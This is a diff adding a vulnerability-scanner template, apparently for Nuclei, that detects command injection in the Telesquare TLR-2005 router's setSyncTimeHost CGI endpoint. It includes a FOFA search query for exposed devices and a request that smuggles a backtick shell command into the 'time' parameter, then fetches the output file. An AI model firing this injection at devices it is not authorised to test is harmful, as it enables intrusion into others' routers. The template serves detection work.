@@ -1,0 +1,26 @@
+id: telesquare-tlr2005-setsynctimehost-rce
+info:
+  name: telesquare-tlr2005-setsynctimehost-rce
+  author: unknow
+  severity: critical
+  description: telesquare tlr2005 setsynctimehost 存在命令执行漏洞。
+  tags: telesquare,rce
+  metadata:
+    fofa-query: title="TLR-2005KSH" || banner="TLR-2005KSH login:"
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/admin.cgi?Command=setSyncTimeHost&time=`ls>7eAfbC3d.txt` HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0
+      - |
+        GET /cgi-bin/7eAfbC3d.txt HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2==200 && contains(body_2, ".cgi") && contains(header_2, "text/plain")'
